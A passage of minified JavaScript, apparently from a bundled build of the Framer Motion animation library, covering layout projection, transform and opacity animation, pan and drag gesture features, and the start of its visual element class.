          const { layoutId: t, layout: n } = this.options;
          if (void 0 === t && !n) return;
          const r = this.getTransformTemplate();
          (this.prevTransformTemplateValue = r ? r(this.latestValues, "") : void 0), this.updateSnapshot(), e && this.notifyListeners("willUpdate");
      }
      update() {
          this.updateScheduled = !1;
          if (this.isUpdateBlocked()) return this.unblockUpdate(), this.clearAllSnapshots(), void this.nodes.forEach(PA);
          this.isUpdating || this.nodes.forEach(TA), (this.isUpdating = !1), this.nodes.forEach(RA), this.nodes.forEach(SA), this.nodes.forEach(kA), this.clearAllSnapshots();
          const e = performance.now();
          (cP.delta = JC(0, 1e3 / 60, e - cP.timestamp)), (cP.timestamp = e), (cP.isProcessing = !0), pP.update.process(cP), pP.preRender.process(cP), pP.render.process(cP), (cP.isProcessing = !1);
      }
      didUpdate() {
          this.updateScheduled || ((this.updateScheduled = !0), queueMicrotask(() => this.update()));
      }
      clearAllSnapshots() {
          this.nodes.forEach(_A), this.sharedNodes.forEach(FA);
      }
      scheduleUpdateProjection() {
          gP.preRender(this.updateProjection, !1, !0);
      }
      scheduleCheckAfterUnmount() {
          gP.postRender(() => {
              this.isLayoutDirty ? this.root.didUpdate() : this.root.checkUpdateFailed();
          });
      }
      updateSnapshot() {
          !this.snapshot && this.instance && (this.snapshot = this.measure());
      }
      updateLayout() {
          if (!this.instance) return;
          if ((this.updateScroll(), !((this.options.alwaysMeasureLayout && this.isLead()) || this.isLayoutDirty))) return;
          if (this.resumeFrom && !this.resumeFrom.instance)
              for (let n = 0; n < this.path.length; n++) {
                  this.path[n].updateScroll();
              }
          const e = this.layout;
          (this.layout = this.measure(!1)), (this.layoutCorrected = bz()), (this.isLayoutDirty = !1), (this.projectionDelta = void 0), this.notifyListeners("measure", this.layout.layoutBox);
          const { visualElement: t } = this.options;
          t && t.notify("LayoutMeasure", this.layout.layoutBox, e ? e.layoutBox : void 0);
      }
      updateScroll(e = "measure") {
          let t = Boolean(this.options.layoutScroll && this.instance);
          this.scroll && this.scroll.animationId === this.root.animationId && this.scroll.phase === e && (t = !1), t && (this.scroll = { animationId: this.root.animationId, phase: e, isRoot: r(this.instance), offset: n(this.instance) });
      }
      resetTransform() {
          if (!o) return;
          const e = this.isLayoutDirty || this.shouldResetTransform,
              t = this.projectionDelta && !dA(this.projectionDelta),
              n = this.getTransformTemplate(),
              r = n ? n(this.latestValues, "") : void 0,
              a = r !== this.prevTransformTemplateValue;
          e && (t || Ez(this.latestValues) || a) && (o(this.instance, r), (this.shouldResetTransform = !1), this.scheduleRender());
      }
      measure(e = !0) {
          const t = this.measurePageBox();
          let n = this.removeElementScroll(t);
          var r;
          return e && (n = this.removeTransform(n)), IA((r = n).x), IA(r.y), { animationId: this.root.animationId, measuredBox: t, layoutBox: n, latestValues: {}, source: this.id };
      }
      measurePageBox() {
          const { visualElement: e } = this.options;
          if (!e) return bz();
          const t = e.measureViewportBox(),
              { scroll: n } = this.root;
          return n && (jz(t.x, n.offset.x), jz(t.y, n.offset.y)), t;
      }
      removeElementScroll(e) {
          const t = bz();
          oA(t, e);
          for (let n = 0; n < this.path.length; n++) {
              const r = this.path[n],
                  { scroll: o, options: a } = r;
              if (r !== this.root && o && a.layoutScroll) {
                  if (o.isRoot) {
                      oA(t, e);
                      const { scroll: n } = this.root;
                      n && (jz(t.x, -n.offset.x), jz(t.y, -n.offset.y));
                  }
                  jz(t.x, o.offset.x), jz(t.y, o.offset.y);
              }
          }
          return t;
      }
      applyTransform(e, t = !1) {
          const n = bz();
          oA(n, e);
          for (let r = 0; r < this.path.length; r++) {
              const e = this.path[r];
              !t && e.options.layoutScroll && e.scroll && e !== e.root && Mz(n, { x: -e.scroll.offset.x, y: -e.scroll.offset.y }), Ez(e.latestValues) && Mz(n, e.latestValues);
          }
          return Ez(this.latestValues) && Mz(n, this.latestValues), n;
      }
      removeTransform(e) {
          const t = bz();
          oA(t, e);
          for (let n = 0; n < this.path.length; n++) {
              const e = this.path[n];
              if (!e.instance) continue;
              if (!Ez(e.latestValues)) continue;
              kz(e.latestValues) && e.updateSnapshot();
              const r = bz();
              oA(r, e.measurePageBox()), cA(t, e.latestValues, e.snapshot ? e.snapshot.layoutBox : void 0, r);
          }
          return Ez(this.latestValues) && cA(t, this.latestValues), t;
      }
      setTargetDelta(e) {
          (this.targetDelta = e), this.root.scheduleUpdateProjection(), (this.isProjectionDirty = !0);
      }
      setOptions(e) {
          this.options = { ...this.options, ...e, crossfade: void 0 === e.crossfade || e.crossfade };
      }
      clearMeasurements() {
          (this.scroll = void 0), (this.layout = void 0), (this.snapshot = void 0), (this.prevTransformTemplateValue = void 0), (this.targetDelta = void 0), (this.target = void 0), (this.isLayoutDirty = !1);
      }
      forceRelativeParentToResolveTarget() {
          this.relativeParent && this.relativeParent.resolvedRelativeTargetAt !== cP.timestamp && this.relativeParent.resolveTargetDelta(!0);
      }
      resolveTargetDelta(e = !1) {
          var t;
          const n = this.getLead();
          this.isProjectionDirty || (this.isProjectionDirty = n.isProjectionDirty),
              this.isTransformDirty || (this.isTransformDirty = n.isTransformDirty),
              this.isSharedProjectionDirty || (this.isSharedProjectionDirty = n.isSharedProjectionDirty);
          const r = Boolean(this.resumingFrom) || this !== n;
          if (!(e || (r && this.isSharedProjectionDirty) || this.isProjectionDirty || (null === (t = this.parent) || void 0 === t ? void 0 : t.isProjectionDirty) || this.attemptToResolveRelativeTarget)) return;
          const { layout: o, layoutId: a } = this.options;
          if (this.layout && (o || a)) {
              if (((this.resolvedRelativeTargetAt = cP.timestamp), !this.targetDelta && !this.relativeTarget)) {
                  const e = this.getClosestProjectingParent();
                  e && e.layout && 1 !== this.animationProgress
                      ? ((this.relativeParent = e),
                        this.forceRelativeParentToResolveTarget(),
                        (this.relativeTarget = bz()),
                        (this.relativeTargetOrigin = bz()),
                        fz(this.relativeTargetOrigin, this.layout.layoutBox, e.layout.layoutBox),
                        oA(this.relativeTarget, this.relativeTargetOrigin))
                      : (this.relativeParent = this.relativeTarget = void 0);
              }
              if (this.relativeTarget || this.targetDelta) {
                  var i, s, l;
                  if (
                      (this.target || ((this.target = bz()), (this.targetWithTransforms = bz())),
                      this.relativeTarget && this.relativeTargetOrigin && this.relativeParent && this.relativeParent.target
                          ? (this.forceRelativeParentToResolveTarget(), (i = this.target), (s = this.relativeTarget), (l = this.relativeParent.target), uz(i.x, s.x, l.x), uz(i.y, s.y, l.y))
                          : this.targetDelta
                          ? (Boolean(this.resumingFrom) ? (this.target = this.applyTransform(this.layout.layoutBox)) : oA(this.target, this.layout.layoutBox), zz(this.target, this.targetDelta))
                          : oA(this.target, this.layout.layoutBox),
                      this.attemptToResolveRelativeTarget)
                  ) {
                      this.attemptToResolveRelativeTarget = !1;
                      const e = this.getClosestProjectingParent();
                      e && Boolean(e.resumingFrom) === Boolean(this.resumingFrom) && !e.options.layoutScroll && e.target && 1 !== this.animationProgress
                          ? ((this.relativeParent = e),
                            this.forceRelativeParentToResolveTarget(),
                            (this.relativeTarget = bz()),
                            (this.relativeTargetOrigin = bz()),
                            fz(this.relativeTargetOrigin, this.target, e.target),
                            oA(this.relativeTarget, this.relativeTargetOrigin))
                          : (this.relativeParent = this.relativeTarget = void 0);
                  }
                  xA.resolvedTargetDeltas++;
              }
          }
      }
      getClosestProjectingParent() {
          if (this.parent && !kz(this.parent.latestValues) && !Cz(this.parent.latestValues)) return this.parent.isProjecting() ? this.parent : this.parent.getClosestProjectingParent();
      }
      isProjecting() {
          return Boolean((this.relativeTarget || this.targetDelta || this.options.layoutRoot) && this.layout);
      }
      calcProjection() {
          var e;
          const t = this.getLead(),
              n = Boolean(this.resumingFrom) || this !== t;
          let r = !0;
          if (
              ((this.isProjectionDirty || (null === (e = this.parent) || void 0 === e ? void 0 : e.isProjectionDirty)) && (r = !1),
              n && (this.isSharedProjectionDirty || this.isTransformDirty) && (r = !1),
              this.resolvedRelativeTargetAt === cP.timestamp && (r = !1),
              r)
          )
              return;
          const { layout: o, layoutId: a } = this.options;
          if (
              ((this.isTreeAnimating = Boolean((this.parent && this.parent.isTreeAnimating) || this.currentAnimation || this.pendingAnimation)),
              this.isTreeAnimating || (this.targetDelta = this.relativeTarget = void 0),
              !this.layout || (!o && !a))
          )
              return;
          oA(this.layoutCorrected, this.layout.layoutBox);
          const i = this.treeScale.x,
              s = this.treeScale.y;
          !(function (e, t, n, r = !1) {
              const o = n.length;
              if (!o) return;
              let a, i;
              t.x = t.y = 1;
              for (let s = 0; s < o; s++) {
                  (a = n[s]), (i = a.projectionDelta);
                  const o = a.instance;
                  (o && o.style && "contents" === o.style.display) ||
                      (r && a.options.layoutScroll && a.scroll && a !== a.root && Mz(e, { x: -a.scroll.offset.x, y: -a.scroll.offset.y }),
                      i && ((t.x *= i.x.scale), (t.y *= i.y.scale), zz(e, i)),
                      r && Ez(a.latestValues) && Mz(e, a.latestValues));
              }
              (t.x = Az(t.x)), (t.y = Az(t.y));
          })(this.layoutCorrected, this.treeScale, this.path, n),
              !t.layout || t.target || (1 === this.treeScale.x && 1 === this.treeScale.y) || (t.target = t.layout.layoutBox);
          const { target: l } = t;
          if (!l) return void (this.projectionTransform && ((this.projectionDelta = yz()), (this.projectionTransform = "none"), this.scheduleRender()));
          this.projectionDelta || ((this.projectionDelta = yz()), (this.projectionDeltaWithTransform = yz()));
          const c = this.projectionTransform;
          cz(this.projectionDelta, this.layoutCorrected, l, this.latestValues),
              (this.projectionTransform = mA(this.projectionDelta, this.treeScale)),
              (this.projectionTransform === c && this.treeScale.x === i && this.treeScale.y === s) || ((this.hasProjected = !0), this.scheduleRender(), this.notifyListeners("projectionUpdate", l)),
              xA.recalculatedProjection++;
      }
      hide() {
          this.isVisible = !1;
      }
      show() {
          this.isVisible = !0;
      }
      scheduleRender(e = !0) {
          if ((this.options.scheduleRender && this.options.scheduleRender(), e)) {
              const e = this.getStack();
              e && e.scheduleRender();
          }
          this.resumingFrom && !this.resumingFrom.instance && (this.resumingFrom = void 0);
      }
      setAnimationOrigin(e, t = !1) {
          const n = this.snapshot,
              r = n ? n.latestValues : {},
              o = { ...this.latestValues },
              a = yz();
          (this.relativeParent && this.relativeParent.options.layoutRoot) || (this.relativeTarget = this.relativeTargetOrigin = void 0), (this.attemptToResolveRelativeTarget = !t);
          const i = bz(),
              s = (n ? n.source : void 0) !== (this.layout ? this.layout.source : void 0),
              l = this.getStack(),
              c = !l || l.members.length <= 1,
              u = Boolean(s && !c && !0 === this.options.crossfade && !this.path.some(LA));
          let d;
          (this.animationProgress = 0),
              (this.mixTargetDelta = (t) => {
                  const n = t / 1e3;
                  var l, f, p, h;
                  NA(a.x, e.x, n),
                      NA(a.y, e.y, n),
                      this.setTargetDelta(a),
                      this.relativeTarget &&
                          this.relativeTargetOrigin &&
                          this.layout &&
                          this.relativeParent &&
                          this.relativeParent.layout &&
                          (fz(i, this.layout.layoutBox, this.relativeParent.layout.layoutBox),
                          (l = this.relativeTarget),
                          (f = this.relativeTargetOrigin),
                          (p = i),
                          (h = n),
                          MA(l.x, f.x, p.x, h),
                          MA(l.y, f.y, p.y, h),
                          d && fA(this.relativeTarget, d) && (this.isProjectionDirty = !1),
                          d || (d = bz()),
                          oA(d, this.relativeTarget)),
                      s &&
                          ((this.animationValues = o),
                          (function (e, t, n, r, o, a) {
                              o
                                  ? ((e.opacity = gT(0, void 0 !== n.opacity ? n.opacity : 1, eA(r))), (e.opacityExit = gT(void 0 !== t.opacity ? t.opacity : 1, 0, tA(r))))
                                  : a && (e.opacity = gT(void 0 !== t.opacity ? t.opacity : 1, void 0 !== n.opacity ? n.opacity : 1, r));
                              for (let i = 0; i < Qz; i++) {
                                  const o = `border${Gz[i]}Radius`;
                                  let a = Jz(t, o),
                                      s = Jz(n, o);
                                  (void 0 === a && void 0 === s) ||
                                      (a || (a = 0), s || (s = 0), 0 === a || 0 === s || Zz(a) === Zz(s) ? ((e[o] = Math.max(gT(Kz(a), Kz(s), r), 0)), (u_.test(s) || u_.test(a)) && (e[o] += "%")) : (e[o] = s));
                              }
                              (t.rotate || n.rotate) && (e.rotate = gT(t.rotate || 0, n.rotate || 0, r));
                          })(o, r, this.latestValues, n, u, c)),
                      this.root.scheduleUpdateProjection(),
                      this.scheduleRender(),
                      (this.animationProgress = n);
              }),
              this.mixTargetDelta(this.options.layoutRoot ? 1e3 : 0);
      }
      startAnimation(e) {
          this.notifyListeners("animationStart"),
              this.currentAnimation && this.currentAnimation.stop(),
              this.resumingFrom && this.resumingFrom.currentAnimation && this.resumingFrom.currentAnimation.stop(),
              this.pendingAnimation && (vP(this.pendingAnimation), (this.pendingAnimation = void 0)),
              (this.pendingAnimation = gP.update(() => {
                  (Vz.hasAnimatedSinceResize = !0),
                      (this.currentAnimation = (function (e, t, n) {
                          const r = qC(e) ? e : jR(e);
                          return r.start(_R("", r, t, n)), r.animation;
                      })(0, 1e3, {
                          ...e,
                          onUpdate: (t) => {
                              this.mixTargetDelta(t), e.onUpdate && e.onUpdate(t);
                          },
                          onComplete: () => {
                              e.onComplete && e.onComplete(), this.completeAnimation();
                          },
                      })),
                      this.resumingFrom && (this.resumingFrom.currentAnimation = this.currentAnimation),
                      (this.pendingAnimation = void 0);
              }));
      }
      completeAnimation() {
          this.resumingFrom && ((this.resumingFrom.currentAnimation = void 0), (this.resumingFrom.preserveOpacity = void 0));
          const e = this.getStack();
          e && e.exitAnimationComplete(), (this.resumingFrom = this.currentAnimation = this.animationValues = void 0), this.notifyListeners("animationComplete");
      }
      finishAnimation() {
          this.currentAnimation && (this.mixTargetDelta && this.mixTargetDelta(1e3), this.currentAnimation.stop()), this.completeAnimation();
      }
      applyTransformsToTarget() {
          const e = this.getLead();
          let { targetWithTransforms: t, target: n, layout: r, latestValues: o } = e;
          if (t && n && r) {
              if (this !== e && this.layout && r && DA(this.options.animationType, this.layout.layoutBox, r.layoutBox)) {
                  n = this.target || bz();
                  const t = iz(this.layout.layoutBox.x);
                  (n.x.min = e.target.x.min), (n.x.max = n.x.min + t);
                  const r = iz(this.layout.layoutBox.y);
                  (n.y.min = e.target.y.min), (n.y.max = n.y.min + r);
              }
              oA(t, n), Mz(t, o), cz(this.projectionDeltaWithTransform, this.layoutCorrected, t, o);
          }
      }
      registerSharedNode(e, t) {
          this.sharedNodes.has(e) || this.sharedNodes.set(e, new hA());
          this.sharedNodes.get(e).add(t);
          const n = t.options.initialPromotionConfig;
          t.promote({ transition: n ? n.transition : void 0, preserveFollowOpacity: n && n.shouldPreserveFollowOpacity ? n.shouldPreserveFollowOpacity(t) : void 0 });
      }
      isLead() {
          const e = this.getStack();
          return !e || e.lead === this;
      }
      getLead() {
          var e;
          const { layoutId: t } = this.options;
          return (t && (null === (e = this.getStack()) || void 0 === e ? void 0 : e.lead)) || this;
      }
      getPrevLead() {
          var e;
          const { layoutId: t } = this.options;
          return t ? (null === (e = this.getStack()) || void 0 === e ? void 0 : e.prevLead) : void 0;
      }
      getStack() {
          const { layoutId: e } = this.options;
          if (e) return this.root.sharedNodes.get(e);
      }
      promote({ needsReset: e, transition: t, preserveFollowOpacity: n } = {}) {
          const r = this.getStack();
          r && r.promote(this, n), e && ((this.projectionDelta = void 0), (this.needsReset = !0)), t && this.setOptions({ transition: t });
      }
      relegate() {
          const e = this.getStack();
          return !!e && e.relegate(this);
      }
      resetRotation() {
          const { visualElement: e } = this.options;
          if (!e) return;
          let t = !1;
          const { latestValues: n } = e;
          if (((n.rotate || n.rotateX || n.rotateY || n.rotateZ) && (t = !0), !t)) return;
          const r = {};
          for (let o = 0; o < yA.length; o++) {
              const t = "rotate" + yA[o];
              n[t] && ((r[t] = n[t]), e.setStaticValue(t, 0));
          }
          e.render();
          for (const o in r) e.setStaticValue(o, r[o]);
          e.scheduleRender();
      }
      getProjectionStyles(e = {}) {
          var t, n;
          const r = {};
          if (!this.instance || this.isSVG) return r;
          if (!this.isVisible) return { visibility: "hidden" };
          r.visibility = "";
          const o = this.getTransformTemplate();
          if (this.needsReset) return (this.needsReset = !1), (r.opacity = ""), (r.pointerEvents = H_(e.pointerEvents) || ""), (r.transform = o ? o(this.latestValues, "") : "none"), r;
          const a = this.getLead();
          if (!this.projectionDelta || !this.layout || !a.target) {
              const t = {};
              return (
                  this.options.layoutId && ((t.opacity = void 0 !== this.latestValues.opacity ? this.latestValues.opacity : 1), (t.pointerEvents = H_(e.pointerEvents) || "")),
                  this.hasProjected && !Ez(this.latestValues) && ((t.transform = o ? o({}, "") : "none"), (this.hasProjected = !1)),
                  t
              );
          }
          const i = a.animationValues || a.latestValues;
          this.applyTransformsToTarget(), (r.transform = mA(this.projectionDeltaWithTransform, this.treeScale, i)), o && (r.transform = o(i, r.transform));
          const { x: s, y: l } = this.projectionDelta;
          (r.transformOrigin = `${100 * s.origin}% ${100 * l.origin}% 0`),
              a.animationValues
                  ? (r.opacity = a === this ? (null !== (n = null !== (t = i.opacity) && void 0 !== t ? t : this.latestValues.opacity) && void 0 !== n ? n : 1) : this.preserveOpacity ? this.latestValues.opacity : i.opacityExit)
                  : (r.opacity = a === this ? (void 0 !== i.opacity ? i.opacity : "") : void 0 !== i.opacityExit ? i.opacityExit : 0);
          for (const c in VC) {
              if (void 0 === i[c]) continue;
              const { correct: e, applyTo: t } = VC[c],
                  n = "none" === r.transform ? i[c] : e(i[c], a);
              if (t) {
                  const e = t.length;
                  for (let o = 0; o < e; o++) r[t[o]] = n;
              } else r[c] = n;
          }
          return this.options.layoutId && (r.pointerEvents = a === this ? H_(e.pointerEvents) || "" : "none"), r;
      }
      clearSnapshot() {
          this.resumeFrom = this.snapshot = void 0;
      }
      resetTree() {
          this.root.nodes.forEach((e) => {
              var t;
              return null === (t = e.currentAnimation) || void 0 === t ? void 0 : t.stop();
          }),
              this.root.nodes.forEach(PA),
              this.root.sharedNodes.clear();
      }
  };
}
function SA(e) {
  e.updateLayout();
}
function kA(e) {
  var t;
  const n = (null === (t = e.resumeFrom) || void 0 === t ? void 0 : t.snapshot) || e.snapshot;
  if (e.isLead() && e.layout && n && e.hasListeners("didUpdate")) {
      const { layoutBox: t, measuredBox: r } = e.layout,
          { animationType: o } = e.options,
          a = n.source !== e.layout.source;
      "size" === o
          ? xz((e) => {
                const r = a ? n.measuredBox[e] : n.layoutBox[e],
                    o = iz(r);
                (r.min = t[e].min), (r.max = r.min + o);
            })
          : DA(o, n.layoutBox, t) &&
            xz((r) => {
                const o = a ? n.measuredBox[r] : n.layoutBox[r],
                    i = iz(t[r]);
                (o.max = o.min + i), e.relativeTarget && !e.currentAnimation && ((e.isProjectionDirty = !0), (e.relativeTarget[r].max = e.relativeTarget[r].min + i));
            });
      const i = yz();
      cz(i, t, n.layoutBox);
      const s = yz();
      a ? cz(s, e.applyTransform(r, !0), n.measuredBox) : cz(s, t, n.layoutBox);
      const l = !dA(i);
      let c = !1;
      if (!e.resumeFrom) {
          const r = e.getClosestProjectingParent();
          if (r && !r.resumeFrom) {
              const { snapshot: o, layout: a } = r;
              if (o && a) {
                  const i = bz();
                  fz(i, n.layoutBox, o.layoutBox);
                  const s = bz();
                  fz(s, t, a.layoutBox), fA(i, s) || (c = !0), r.options.layoutRoot && ((e.relativeTarget = s), (e.relativeTargetOrigin = i), (e.relativeParent = r));
              }
          }
      }
      e.notifyListeners("didUpdate", { layout: t, snapshot: n, delta: s, layoutDelta: i, hasLayoutChanged: l, hasRelativeTargetChanged: c });
  } else if (e.isLead()) {
      const { onExitComplete: t } = e.options;
      t && t();
  }
  e.options.transition = void 0;
}
function EA(e) {
  xA.totalNodes++,
      e.parent &&
          (e.isProjecting() || (e.isProjectionDirty = e.parent.isProjectionDirty),
          e.isSharedProjectionDirty || (e.isSharedProjectionDirty = Boolean(e.isProjectionDirty || e.parent.isProjectionDirty || e.parent.isSharedProjectionDirty)),
          e.isTransformDirty || (e.isTransformDirty = e.parent.isTransformDirty));
}
function CA(e) {
  e.isProjectionDirty = e.isSharedProjectionDirty = e.isTransformDirty = !1;
}
function _A(e) {
  e.clearSnapshot();
}
function PA(e) {
  e.clearMeasurements();
}
function TA(e) {
  e.isLayoutDirty = !1;
}
function RA(e) {
  const { visualElement: t } = e.options;
  t && t.getProps().onBeforeLayoutMeasure && t.notify("BeforeLayoutMeasure"), e.resetTransform();
}
function zA(e) {
  e.finishAnimation(), (e.targetDelta = e.relativeTarget = e.target = void 0), (e.isProjectionDirty = !0);
}
function AA(e) {
  e.resolveTargetDelta();
}
function jA(e) {
  e.calcProjection();
}
function OA(e) {
  e.resetRotation();
}
function FA(e) {
  e.removeLeadSnapshot();
}
function NA(e, t, n) {
  (e.translate = gT(t.translate, 0, n)), (e.scale = gT(t.scale, 1, n)), (e.origin = t.origin), (e.originPoint = t.originPoint);
}
function MA(e, t, n, r) {
  (e.min = gT(t.min, n.min, r)), (e.max = gT(t.max, n.max, r));
}
function LA(e) {
  return e.animationValues && void 0 !== e.animationValues.opacityExit;
}
const BA = { duration: 0.45, ease: [0.4, 0, 0.1, 1] };
function IA(e) {
  (e.min = Math.round(e.min)), (e.max = Math.round(e.max));
}
function DA(e, t, n) {
  return "position" === e || ("preserve-aspect" === e && !sz(pA(t), pA(n), 0.2));
}
const $A = wA({
      attachResizeListener: (e, t) => Q_(e, "resize", t),
      measureScroll: () => ({ x: document.documentElement.scrollLeft || document.body.scrollLeft, y: document.documentElement.scrollTop || document.body.scrollTop }),
      checkIsScrollRoot: () => !0,
  }),
  VA = { current: void 0 },
  UA = wA({
      measureScroll: (e) => ({ x: e.scrollLeft, y: e.scrollTop }),
      defaultParent: () => {
          if (!VA.current) {
              const e = new $A({});
              e.mount(window), e.setOptions({ layoutScroll: !0 }), (VA.current = e);
          }
          return VA.current;
      },
      resetTransform: (e, t) => {
          e.style.transform = void 0 !== t ? t : "none";
      },
      checkIsScrollRoot: (e) => Boolean("fixed" === window.getComputedStyle(e).position),
  }),
  WA = {
      pan: {
          Feature: class extends lP {
              constructor() {
                  super(...arguments), (this.removePointerDownListener = xP);
              }
              onPointerDown(e) {
                  this.session = new JR(e, this.createPanHandlers(), { transformPagePoint: this.node.getTransformPagePoint() });
              }
              createPanHandlers() {
                  const { onPanSessionStart: e, onPanStart: t, onPan: n, onPanEnd: r } = this.node.getProps();
                  return {
                      onSessionStart: $z(e),
                      onStart: $z(t),
                      onMove: n,
                      onEnd: (e, t) => {
                          delete this.session, r && gP.update(() => r(e, t));
                      },
                  };
              }
              mount() {
                  this.removePointerDownListener = eP(this.node.current, "pointerdown", (e) => this.onPointerDown(e));
              }
              update() {
                  this.session && this.session.updateHandlers(this.createPanHandlers());
              }
              unmount() {
                  this.removePointerDownListener(), this.session && this.session.end();
              }
          },
      },
      drag: {
          Feature: class extends lP {
              constructor(e) {
                  super(e), (this.removeGroupControls = xP), (this.removeListeners = xP), (this.controls = new Iz(e));
              }
              mount() {
                  const { dragControls: e } = this.node.getProps();
                  e && (this.removeGroupControls = e.subscribe(this.controls)), (this.removeListeners = this.controls.addListeners() || xP);
              }
              unmount() {
                  this.removeGroupControls(), this.removeListeners();
              }
          },
          ProjectionNode: UA,
          MeasureLayout: Yz,
      },
  },
  HA = /var\((--[a-zA-Z0-9-_]+),? ?([a-zA-Z0-9 ()%#.,-]+)?\)/;
function qA(e, t, n = 1) {
  const [r, o] = (function (e) {
      const t = HA.exec(e);
      if (!t) return [,];
      const [, n, r] = t;
      return [n, r];
  })(e);
  if (!r) return;
  const a = window.getComputedStyle(t).getPropertyValue(r);
  return a ? a.trim() : KC(o) ? qA(o, t, n + 1) : o;
}
const YA = new Set(["width", "height", "top", "left", "right", "bottom", "x", "y", "translateX", "translateY"]),
  XA = (e) => YA.has(e),
  GA = (e) => e === e_ || e === d_,
  QA = (e, t) => parseFloat(e.split(", ")[t]),
  KA = (e, t) => (n, { transform: r }) => {
      if ("none" === r || !r) return 0;
      const o = r.match(/^matrix3d\((.+)\)$/);
      if (o) return QA(o[1], t);
      {
          const t = r.match(/^matrix\((.+)\)$/);
          return t ? QA(t[1], e) : 0;
      }
  },
  ZA = new Set(["x", "y", "z"]),
  JA = UC.filter((e) => !ZA.has(e));
const ej = {
      width: ({ x: e }, { paddingLeft: t = "0", paddingRight: n = "0" }) => e.max - e.min - parseFloat(t) - parseFloat(n),
      height: ({ y: e }, { paddingTop: t = "0", paddingBottom: n = "0" }) => e.max - e.min - parseFloat(t) - parseFloat(n),
      top: (e, { top: t }) => parseFloat(t),
      left: (e, { left: t }) => parseFloat(t),
      bottom: ({ y: e }, { top: t }) => parseFloat(t) + (e.max - e.min),
      right: ({ x: e }, { left: t }) => parseFloat(t) + (e.max - e.min),
      x: KA(4, 13),
      y: KA(5, 14),
  },
  tj = (e, t, n = {}, r = {}) => {
      (t = { ...t }), (r = { ...r });
      const o = Object.keys(t).filter(XA);
      let a = [],
          i = !1;
      const s = [];
      if (
          (o.forEach((o) => {
              const l = e.getValue(o);
              if (!e.hasValue(o)) return;
              let c = n[o],
                  u = NR(c);
              const d = t[o];
              let f;
              if (V_(d)) {
                  const e = d.length,
                      t = null === d[0] ? 1 : 0;
                  (c = d[t]), (u = NR(c));
                  for (let n = t; n < e && null !== d[n]; n++) f ? OP(NR(d[n]) === f) : (f = NR(d[n]));
              } else f = NR(d);
              if (u !== f)
                  if (GA(u) && GA(f)) {
                      const e = l.get();
                      "string" == typeof e && l.set(parseFloat(e)), "string" == typeof d ? (t[o] = parseFloat(d)) : Array.isArray(d) && f === d_ && (t[o] = d.map(parseFloat));
                  } else
                      (null == u ? void 0 : u.transform) && (null == f ? void 0 : f.transform) && (0 === c || 0 === d)
                          ? 0 === c
                              ? l.set(f.transform(c))
                              : (t[o] = u.transform(d))
                          : (i ||
                                ((a = (function (e) {
                                    const t = [];
                                    return (
                                        JA.forEach((n) => {
                                            const r = e.getValue(n);
                                            void 0 !== r && (t.push([n, r.get()]), r.set(n.startsWith("scale") ? 1 : 0));
                                        }),
                                        t.length && e.render(),
                                        t
                                    );
                                })(e)),
                                (i = !0)),
                            s.push(o),
                            (r[o] = void 0 !== r[o] ? r[o] : t[o]),
                            l.jump(d));
          }),
          s.length)
      ) {
          const n = s.indexOf("height") >= 0 ? window.pageYOffset : null,
              o = ((e, t, n) => {
                  const r = t.measureViewportBox(),
                      o = t.current,
                      a = getComputedStyle(o),
                      { display: i } = a,
                      s = {};
                  "none" === i && t.setStaticValue("display", e.display || "block"),
                      n.forEach((e) => {
                          s[e] = ej[e](r, a);
                      }),
                      t.render();
                  const l = t.measureViewportBox();
                  return (
                      n.forEach((n) => {
                          const r = t.getValue(n);
                          r && r.jump(s[n]), (e[n] = ej[n](l, a));
                      }),
                      e
                  );
              })(t, e, s);
          return (
              a.length &&
                  a.forEach(([t, n]) => {
                      e.getValue(t).set(n);
                  }),
              e.render(),
              xC && null !== n && window.scrollTo({ top: n }),
              { target: o, transitionEnd: r }
          );
      }
      return { target: t, transitionEnd: r };
  };
function nj(e, t, n, r) {
  return ((e) => Object.keys(e).some(XA))(t) ? tj(e, t, n, r) : { target: t, transitionEnd: r };
}
const rj = (e, t, n, r) => {
      const o = (function (e, { ...t }, n) {
          const r = e.current;
          if (!(r instanceof Element)) return { target: t, transitionEnd: n };
          n && (n = { ...n }),
              e.values.forEach((e) => {
                  const t = e.get();
                  if (!KC(t)) return;
                  const n = qA(t, r);
                  n && e.set(n);
              });
          for (const o in t) {
              const e = t[o];
              if (!KC(e)) continue;
              const a = qA(e, r);
              a && ((t[o] = a), n || (n = {}), void 0 === n[o] && (n[o] = e));
          }
          return { target: t, transitionEnd: n };
      })(e, t, r);
      return nj(e, (t = o.target), n, (r = o.transitionEnd));
  },
  oj = { current: null },
  aj = { current: !1 };
const ij = new WeakMap(),
  sj = Object.keys(OC),
  lj = sj.length,
  cj = ["AnimationStart", "AnimationComplete", "Update", "BeforeLayoutMeasure", "LayoutMeasure", "LayoutAnimationStart", "LayoutAnimationComplete"],
  uj = PC.length;
class dj {
  constructor({ parent: e, props: t, presenceContext: n, reducedMotionConfig: r, visualState: o }, a = {}) {
      (this.current = null),
          (this.children = new Set()),
          (this.isVariantNode = !1),
          (this.isControllingVariants = !1),
          (this.shouldReduceMotion = null),
          (this.values = new Map()),
          (this.features = {}),
          (this.valueSubscriptions = new Map()),
          (this.prevMotionValues = {}),
          (this.events = {}),
          (this.propEventSubscriptions = {}),
          (this.notifyUpdate = () => this.notify("Update", this.latestValues)),
          (this.render = () => {
              this.current && (this.triggerBuild(), this.renderInstance(this.current, this.renderState, this.props.style, this.projection));
          }),
          (this.scheduleRender = () => gP.render(this.render, !1, !0));
      const { latestValues: i, renderState: s } = o;
      (this.latestValues = i),
          (this.baseTarget = { ...i }),
          (this.initialValues = t.initial ? { ...i } : {}),
          (this.renderState = s),
          (this.parent = e),
          (this.props = t),
          (this.presenceContext = n),
          (this.depth = e ? e.depth + 1 : 0),
          (this.reducedMotionConfig = r),
          (this.options = a),
          (this.isControllingVariants = TC(t)),
          (this.isVariantNode = RC(t)),
          this.isVariantNode && (this.variantChildren = new Set()),
          (this.manuallyAnimateOnMount = Boolean(e && e.current));
      const { willChange: l, ...c } = this.scrapeMotionValuesFromProps(t, {});
      for (const u in c) {
          const e = c[u];
          void 0 !== i[u] && qC(e) && (e.set(i[u], !1), PR(l) && l.add(u));
      }
  }
  scrapeMotionValuesFromProps(e, t) {
      return {};
  }
  mount(e) {
      (this.current = e),
          ij.set(e, this),
          this.projection && !this.projection.instance && this.projection.mount(e),
          this.parent && this.isVariantNode && !this.isControllingVariants && (this.removeFromVariantTree = this.parent.addVariantChild(this)),
          this.values.forEach((e, t) => this.bindToMotionValue(t, e)),
          aj.current ||
              (function () {
                  if (((aj.current = !0), xC))
                      if (window.matchMedia) {
                          const e = window.matchMedia("(prefers-reduced-motion)"),
